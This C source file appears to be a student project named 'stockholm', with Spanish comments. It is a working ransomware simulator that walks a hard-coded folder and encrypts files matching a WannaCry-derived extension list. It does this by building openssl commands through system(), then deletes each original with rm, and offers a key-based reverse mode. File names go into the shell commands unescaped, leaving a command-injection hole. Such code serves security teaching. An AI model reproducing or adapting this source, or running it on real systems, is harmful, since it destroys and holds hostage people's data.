#include <stdio.h>
#include <unistd.h>
#include <sys/uio.h>
#include <fcntl.h>
#include <time.h>
#include <sys/random.h>
#include <signal.h>
#include <sys/types.h>
#include <string.h>
#include <limits.h>
#include <stdlib.h> 
#include <dirent.h> //librería para trabajar con directorios

int	encrypt_files(int sil);
char	check_extension(char *file);

//////////////// FUNCIONES LIBFT ///////////////////////

char	*ft_strjoin(char const *s1, char const *s2) //función que se encarga de unir el segundo string al primero
{
	char	*str;
	size_t	i;
	size_t	j;

	if (!s1 || !s2)
		return (0);
	str = (char *) malloc(sizeof(char) * (strlen(s1) + strlen(s2) + 1));
	if(!str)
		return (0);
	i = 0;
	while (s1[i])
	{
		str[i] = s1[i];
		i++;
	}
	j = 0;
	while (s2[j])
	{
		str[i + j] = s2[j];
		j++;
	}
	str[i + j] = '\0';
	return (str);
}

char *itoa(long long n) //función que convierte un array de enteros a string
{
	char		*str;
	long long	nbr;
	size_t		size;
	
	nbr = n;
	size = n > 0 ? 0 : 1;
	nbr = nbr> 0 ? nbr : -nbr;
/*	if (n > 0)
		size = 0;
	else
		size = 1;

	if (nbr < 0)
		nbr = -nbr;
*/
	while (n > 0)
	{
		n /= 10;
		size++;
	}
	if (!(str = (char *)malloc(size + 1)))
		return (0);
	*(str + size--) = '\0';
	while (nbr > 0)
	{
		*(str + size--) = nbr % 10 + '0';
		nbr /= 10;
	}
	if (size == 0 && str[1] == '\0')
		*(str + size) = '0';
	else if (size == 0 && str[1] != '\0')
		*(str + size) = '-';
	return (str);
}

///////////////////////////// FUNCIONES LIBFT //////////////////////////////////

//////////////////////// CONTROL DE ERRORES Y MENÚ /////////////////////////////

int	control_letter(char *s) //función que comprueba que las flags sean correctas
{
	char	*del ;
	char	*file;
	int		i;

	del = "rm ";
	file = ".stockholm.txt";
	i = 0;
	if (strcmp(s, "-help") == 0 || strcmp(s, "-h") == 0) //si la flag es -h o -help mostrará el texto de ayuda
	{
		printf("Este programa tiene las siguientes opciones:\n\n▶ -help o -h para mostrar la ayuda actual.🆘\n▶ -version o -v para mostrar la versión del programa.🆔\n▶ -reverse o -r seguida de la clave introducida como argumento para revertir la infección.⏪\n▶ -silent o -s para que el programa no produzca ningún output.🔇\n\n");
		exit (0);
	}
	else if (strcmp(s, "-version") == 0 || strcmp(s, "-v") == 0) //si la flag es -version o -v mostrará la versión del programa
	{
		printf("Versión 1.0♻️\n");
		exit (0);
	}
	else if (strcmp(s, "-silent") == 0 || strcmp(s, "-s") == 0) //si la flag es -silent o -s el programa no mostrará output
	{
		return (1);
	}
	return (-1);
}

int	program_name(char *s) //esta función comprueba que el nombre del programa sea correcto, en caso de no compilarse con el nombre correcto el programa no funcionará
{
	int		i;
	int		j;
	char	*name;

	i = 0;
	j = 0;
	name = "./stockholm";
	while (s[i])
	{
		if (s[i] == name[i])
			j++;
		i++;
	}
	if (i == j)
		return (0);
	return (-1);
}

///////////////////// CONTROL DE ERRORES Y MENÚ ///////////////////////////////


char	*gen_key(int sil) //esta función creará la key que será necesaria para desencriptar
{
	int				fd;
	int				i;
	int				l;
	unsigned int	ran;
	int				x;
	long long		result;
	char			*resultfinal;

	i = 0;
	l = 0;
	result = 0;
	resultfinal = malloc(sizeof(char) * (16)); //creamos un buffer de 16 bytes para la key
	while (i != 16) //este bucle rellenará el buffer recién creado con valores numéricos aleatorios
	{
		uint32_t new = arc4random(); //arc4random proporciona valores aleatorios de mayor calidad que las funciones random, rand y rand48 de forma rápida, es una función muy usada en criptografía
		x = (((unsigned int)new) % 10);
		result = result * 10;
		result = result + x;
		i++;
	}
	resultfinal = itoa(result); //convertimos el array de numeros a caracteres para imprimirlo
	if (sil == 0) //si la flag de silencio está desactivada mostrará el siguiente mensaje
		printf("La contraseña para poder llevar a cabo la desencriptacion es: 🔑 %s 🔑 \n\n", resultfinal);
	return (resultfinal);
}

/* Otra opción menos segura para crear una clave
char *gen_key(int sil)
{
    srand((unsigned int)(time(NULL)));
    int index = 0;
    char char1[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/,.-+=~`<>:";
    while (index < 16)
    {
        key[index] = (char1[rand() % (sizeof char1 - 1)]);
        index++;
    }
    key[index] = '\0';
        printf("La clave para revertir la infección es: %s\n", key);
    return (key);
}
*/
int	encrypt_file(char *file, char *key)
{
	char	*str;
	char	*str2;
	char	*str3;
	char	*str4;
	char	*del;
	int		len;

	str = "openssl aes-256-cbc -pbkdf2 -base64 -pass pass:"; //este comando usa la librería openssl para encriptar con una contraseña
	str2 = " -in '"; //este parámetro define que archivo vamos a encriptar
	str3 = "' -out '"; //este parámetro define el nombre de salida que tendrá el encriptado
	str4 = ".ft'"; //usaremos este string para añadir la extensión
	del = "rm '";

	len = strlen(file);
	if (len > 2 && file[len - 1] == 't' && file[len - 2] == 'f' && file[len - 3] == '.')
		return (-1);
	else
	{
		str = ft_strjoin(str, key); //añadimos la key como contraseña de encriptado
		str = ft_strjoin(str, str2); //añadimos la flag para el archivo de entrada (-in)
		str = ft_strjoin(str, file); //añadimos el nombre del archivo como el que va a ser encriptado
		str = ft_strjoin(str, str3); //añadimos la flag para el nombre del output (-out)
		str = ft_strjoin(str, file); //añadimos el nombre del propio archivo que querremos como output
		str = ft_strjoin(str, str4); //añadimos el archivo seguido de .ft como el output del encriptado
	}
	system(str); //ejecutamos la línea que hemos creado por consola
	del = ft_strjoin(del, file);
	del = ft_strjoin(del, "'");//convertimos del en "rm <nombre del archivo sin encriptar>
	system(del); //borramos el archivo desencriptado
	return (0);
}

int encrypt_files(int sil)
{
	char	*path = "/Users/asolano-/infection"; //path que tendremos que modificar para definir la carpeta donde ejecutaremos la función
	DIR 	* d = opendir(path); //creamos una variable que será un puntero a un directorio (viene de la libreria dirent.h)
	char	*temp[2000] = {".der", ".pfx", ".key", ".cr", ".csr", ".p12", ".pem",\
			".od", ".o", ".sxw", ".stw", ".uo", ".3ds", ".max", ".3dm",\
			".txt", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk",\
			".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg",\
			".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",\
			".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb",\
			".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln",\
			".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js",\
			".cmd", ".ba", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch",\
			".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar",\
			".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv",\
			".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4",\
			".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u",\
			".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff",\
			".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg",\
			".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z",\
			".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",\
			".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx",\
			".sti", ".sxi", ".602", ".hwp", ".sn", ".onetoc2", ".dwg",\
			".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".tx", ".vsdx",\
			".vsd", ".edb", ".eml", ".msg", ".os", ".ps", ".potm", ".potx",\
			".ppam", ".ppsx", ".ppsm", ".pps", ".po", ".pptm", ".pptx", ".pp",\
			".xltm", ".xltx", ".xlc", ".xlm", ".xl", ".xlw", ".xlsb", ".xlsm",\
			".xlsx", ".xls", ".dotx", ".dotm", ".do", ".docm", ".docb", ".docx", ".doc"}; //asignamos a temp todas las extensiones a las que afectaba wannacry
	int		i;
	char	*key;
	char	*str;
	char	*file;
	char	*ft_file;
//	char	*copy = "cp ";
	int		fd_ft;
	int		fd;
	int		j;
	int		k;
	struct	dirent * dir; //creamos una variable que almacenará los contenidos del directorio que le asignemos con la función readdir
 	
	i = 0;
	j = 0;
	k = 0;
	str = "chmod 666 ";
	file = ".stockholm.txt";
	ft_file = ".ft.txt";
	fd_ft = open(".ft.txt", O_RDWR | O_APPEND | O_CREAT); //crearemos un archivo oculto .ft.txt (si ya existe será sobreescrito)

	if (d == NULL)
		return (-1);
	key = gen_key(sil); //creamos la key que usaremos para la encriptación
	while ((dir = readdir(d)) != NULL) //comprobamos cada archivo de la carpeta hasta que los hayamos revisado todos
		{
			if(dir->d_type != DT_DIR) //comprobamos que el archivo no sea una carpeta
			{
				i = 0;
				while (temp[i]) //recorremos la lista de extensiones afectadas por wannacry
				{
					if (check_extension(dir->d_name) == 0)
						{/*
							ft_file = dir->d_name;
							copy = ft_strjoin(copy, ft_file);
							ft_file = ft_strjoin(" .", ft_file);
							copy = ft_strjoin(copy, ft_file);
							system (copy);
							break ;
						*/
							while (dir->d_name[j])
							{
								write (fd_ft , &dir->d_name[j], 1);
								j++;
							}
							j = 0;
							if (sil == 0)
								printf("El archivo %s no se encriptará ya que tiene la extension '.ft'. 🔒🚫\n", dir->d_name);
							break ;
						}
					if (strstr(dir->d_name, temp[i]) != NULL && strcmp(dir->d_name, ".ft.txt")) //comprobamos si el archivo contiene alguna de las extensiones
					{
						if (encrypt_file(dir->d_name, key) == -1) //encriptamos el archivo usando la key generada. Si funciona correctamente imprimimos el mensaje (si no hay flag -s). Usamos el break para dejar de recorrer la lista de extensiones y pasamos al siguiente archivo
							break ;
						if (sil == 0)
							printf("El fichero %s se ha encriptado correctamente. 🔐✅\n", dir->d_name);
						break ;
					}
					i++;
				}
			}
			else //si el archivo es una carpeta y no son los directorios . y .. que hay en todos los directorios mostrará el mensaje siguiente (si no hay flag -s)
				if (dir->d_type == DT_DIR && strcmp(dir->d_name,".") != 0 && strcmp(dir->d_name,"..") != 0)
				{
					if (sil == 0)
						printf("El directorio %s no se ha encriptado. 🔓❌\n", dir->d_name);
				}
			
		}
		i = 0;
		fd = open(".stockholm.txt", O_RDWR | O_TRUNC | O_CREAT); //crearemos un archivo oculto .stockholm.txt (si ya existe será sobreescrito)
		str = ft_strjoin(str, file);
		system (str); //le damos permisos 666 al archivo
	while (key[i]) //escribimos la key en el archivo
	{
		write(fd, &key[i], 1);
		i++;
	}
	close(fd); //cerramos el file descriptor que apunta al archivo generado
	free(key); //liberamos la memoria de la key
	closedir(d); //cerramos el directorio
	return (0);
}




char check_extension(char *file) //esta función comprueba si el archivo acaba en .ft
{
	int len;

	len = strlen(file);
	if(len > 2 && file[len - 1] == 't' && file[len - 2] == 'f' && file[len - 3] == '.')
		return (0);
	else
		return (-1);

}

char *quit_extension(char *file) //esta función se usará para eliminar la extensión .ft
{
	int		i;
	int		len;
	char	*result;

	i = 0;
	len = strlen(file);
	result = malloc(sizeof(char) * (len - 2));
	while (i != len - 3)
	{
		result[i] = file[i];
		i++;
	}
	result[i] = '\0';
	return (result);
}

int	desencrypt_file(char *file, char *key) //esta función desencriptará los archivos usando la key dada por argumentos
{
	char	*str;
	char	*str2;
	char	*str3;
	char	*outfile;
	char	*del;

	str = "openssl aes-256-cbc -d -pbkdf2 -base64 -in '"; //le damos la flag -d para desencriptar, la flag -in para indicar el archivo para encriptar y la flag -pbkdf2 para reducir las vulnerabilidades frente a ataques de fuerza bruta(password-based key derivation function)
	str2 = "' -pass pass:"; //le damos la flag -pass para señalarle la contraseña
	str3 = " -out '"; //le damos la flag -out para darle el nombre del output
	del = "rm '";
	outfile = quit_extension(file); //usamos la función quit_extensions para eliminar la extension .ft del archivo encriptado
	str = ft_strjoin(str, file); //al comando le añadimos el nombre del archivo a desencriptar
	str = ft_strjoin(str, str2); //añadimos la flag -pass :pass que nos permitirá darle la key
	str = ft_strjoin(str, key); //añadimos la key
	str = ft_strjoin(str, str3); //añadimos la flag -out para definir el nombre de salida
	str = ft_strjoin(str, outfile); //añadimos el nombre del archivo de salida
	str = ft_strjoin(str, "'");
	system(str); //ejecutamos el comando
	del = ft_strjoin(del, file); //añadimos rm al nombre del archivo para eliminar los archivos encriptados
	del = ft_strjoin(del, "'");
	system(del); //eliminamos los archivos sin encriptar
	return (0);
}

int	ft_reverse(char *key, int sil) //esta función desinfectará los archivos
{
	char *path;
	DIR * d;
	char	*str;
	int		i;
	FILE *f = fopen(".ft.txt", "r"); //abrimos el archivo .ft.txt donde guardamos los archivos .ft
	int	c = getc(f);
	int	length;

	if(f) //si hemos podido abrirlo copiamos lo que haya en el archivo a una string que usaremos más adelante
	{
		fseek (f, 0, SEEK_END);
		length = ftell(f);
		fseek (f, 0, SEEK_SET);
		str = malloc (length);
		if (str)
			fread(str, 1, length, f);
		fclose(f);
	}
	
	path = "/Users/asolano-/infection"; //Este path habrá que modificarlo para poder ejecutar el programa en la carpeta deseada
	d = opendir(path); //abrimos el directorio
	if (d == NULL) //si no se puede devolveremos un error
		return (-1);
	struct dirent * dir;
	while ((dir = readdir(d)) != NULL) //comprobaremos cada archivo hasta que hayamos visto todos
	{
		if (dir-> d_type != DT_DIR) //comprobaremos que el archivo no sea un directorio
		{
			if (check_extension(dir->d_name) == -1) //comprobaremos que la extensión sea .ft, ya que son los archivos a desencriptar
				;
			else
			{
				if(strstr(str, dir->d_name)) //si el archivo está en la string que almacenamos al principio quiere decir que no estaba encriptado así que lo dejamos
				{
					if(sil == 0)
						printf("El fichero %s no se desencriptará ya que no ha sido encriptado. 🔒🚫\n", dir->d_name);
				}
				else if (desencrypt_file(dir->d_name, key) == -1) //si no se puede desencriptar mostrará el siguiente mensaje
				{
					if (sil == 0)
						printf("El fichero %s no se ha desencriptado. 🔐❌\n", dir->d_name);
				}
				else if (sil == 0)//si se puede desencriptar mostrará el siguiente mensaje
				{
					printf("El fichero %s se ha desencriptado correctamente. 🔓✅\n", dir->d_name);
				}
			}
		}
	}
	closedir(d); //cerramos el directorio
	return (0);
}

int check_key(char *key) //esta función comprobará si la key es válida
{
	char	*result;
	int		rid;
	int		fd;
	int		i;

	rid = 1;
	i = 0;
	fd = open(".stockholm.txt", O_RDONLY); //abriremos el archivo oculto en modo solo lectura
	result = malloc(sizeof(char) * (16 + 1)); //crearemos un buffer para la key
	rid = read(fd, result, 16); //leeremos la key y la escribiremos en el buffer
	if (rid == -1) //si la lectura falla, liberaremos el buffer y devolveremos un error
	{
		free(result);
		return (-1);
	}
	result[16] = '\0'; //añadimos el final de string al buffer
	close(fd); //cerramos el file descriptor
	if (strcmp(result, key) == 0) //comparamos la key dada y la correcta, en caso de que coincidan devolveremos 0, si no -1
		return (0);
	else
		return (-1);
}

int	main(int argc, char **argv)
{
	char	*del;
	char	*file;
	
	del = "rm ";
	file = ".stockholm.txt";
	if (argc == 1) //si no damos argumentos
	{
		if (access(".stockholm.txt", F_OK) != -1) //comprobamos si el archivo .stockholm.txt existe y si es así lo borramos
		{
			file = ft_strjoin(del, file);
			system(file);
		}
		if (program_name(argv[0]) == -1) //comprobamos que el nombre del programa sea correcto
		{
			printf("Introduce el nombre de programa correcto.❗\n");
			return (-1);
		}
		if (encrypt_files(0) == -1) //si la función encrypt files falla se cierra el programa con un error
		{
			printf("No se han podido encriptar los ficheros. ❌\n");
			return (-1);
		}
		return (0);
	}
	if (argc != 2 && argc != 1 && argc != 3 && argc != 4) //si damos un número inválido de argumentos se cierra el programa con un error
	{
		printf("Argumentos no válidos. ❌\n");
		return (-1);
	}
	else if (argc == 2) //si damos 1 argumento
	{
		if (program_name(argv[0]) == -1) //comprobamos que el nombre del programa sea correcto
		{
			printf("Introduce el nombre de programa correcto. ❗\n");
			return (-1);
		}
		if (control_letter(argv[1]) == -1) //comprobamos que la flag sea válida
		{
			printf("Prueba con un comando válido. ❌\n");
			return (-1);
		}
		if (control_letter(argv[1]) == 1)
			encrypt_files(1);
	}
	else if(argc == 3) //si damos 2 argumentos (significa que haremos la desinfección, no funcionará en otro caso)
	{
		if(program_name(argv[0]) == -1) //comprobamos que el nombre del programa sea correcto
		{
			printf("Introduce el nombre de programa correcto. ❗\n");
			return (-1);
		}
		if (strcmp(argv[1], "-r") == 0 || strcmp(argv[1], "-reverse") == 0) //comprobamos que la flag sea correcta
		{
			if (check_key(argv[2]) == -1) //comprobamos que la key sea válida
			{
				printf("La clave de desencriptación no es correcta. 🔑❌\n");
				return (-1);
			}
			if (ft_reverse(argv[2], 0) == -1) //si la desinfección no funciona se cierra el programa con un error
			{
				printf("No se han podido desencriptar los archivos. ❌\n");
				return (-1);
			}
					system ("rm .ft.txt");
					system ("rm .stockholm.txt");
		}
		else //si el comando no es válido se cerrará el programa con un error
		{
			printf("Prueba con un comando válido. ❌\n");
			return (-1);
		}
	}
	else if (argc == 4)
	{
		if (program_name(argv[0]) == -1)
			return (-1);
		if(strcmp(argv[1], "-s") == 0 || strcmp(argv[1], "-silent") == 0)
		{
			if (strcmp(argv[2], "-r") == 0 || strcmp(argv[2], "-reverse") == 0) //comprobamos que la flag sea correcta
			{
				if (check_key(argv[3]) == -1) //comprobamos que la key sea válida
					return (-1);
				if (ft_reverse(argv[3], 1) == -1) //si la desinfección no funciona se cierra el programa con un error
				{
					return (-1);
				}
				system ("rm .ft.txt");
				system ("rm .stockholm.txt");
					
			}
		}
	}

	return (0);
}
